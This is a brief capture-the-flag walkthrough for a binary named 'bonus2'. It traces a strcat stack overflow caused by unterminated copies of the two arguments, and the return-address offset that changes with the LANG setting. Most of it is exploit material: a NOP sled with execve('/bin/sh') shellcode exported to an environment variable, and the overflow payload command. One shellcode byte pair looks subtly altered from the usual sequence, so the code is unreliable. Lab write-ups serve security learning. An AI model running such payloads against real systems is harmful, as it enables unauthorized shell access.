# bonus2 walkthrough

* the program takes two command line arguments av[1] and av[2]

* the program sets a global integer depending on the LANG environment variable.

* it copies argv[1] and argv[2] unsafely to local char arrays in main

* buffer gets passed to <greetuser> function since it is not null terminated strcat call in <greetuser> will not stop in 40bytes of av[1] and will concatenate to 32bytes of av[2]

* the distance between str and return address of <greetuser> is 76, if language equals 2 it copies a string with size 13 to str now only 63bytes remaining to reach return address

export LANG=nl // language == 2

* now we place the shellcode in an environment variable

export shell=$(python -c "print '\x90'*90 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x92\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")

* the payload will be like this

./bonus2 $(python -c "print 'B'*40 + ' ' + 'B' *23 + 'addr of shellcode'")
